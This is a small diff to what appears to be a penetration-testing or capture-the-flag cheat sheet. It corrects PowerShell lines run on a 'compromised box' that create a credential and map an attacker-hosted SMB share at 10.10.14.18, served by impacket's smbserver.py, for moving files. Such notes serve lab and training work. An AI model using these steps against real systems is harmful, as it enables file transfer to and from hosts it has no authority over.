@@ -74,5 +74,5 @@ python3 smbserver.py MyFiles smbfileshare -smb2support -user etherk1ll -password
 
 # Compromised box
 1. $pass = convertto-securestring 'password123' -AsPlainText -Force
-2. $cred = New-Object Systemn.Management.Automation.PSCredential('etherk1ll', $pass)
-3. New-PSDrive -Name etherk1ll -PSProvider FileSystem -Credential $cred -\r-Root \\10.10.14.18\MyFiles
+2. $cred = New-Object System.Management.Automation.PSCredential('etherk1ll', $pass)
+3. New-PSDrive -Name etherk1ll -PSProvider FileSystem -Credential $cred -Root \\10.10.14.18\MyFiles
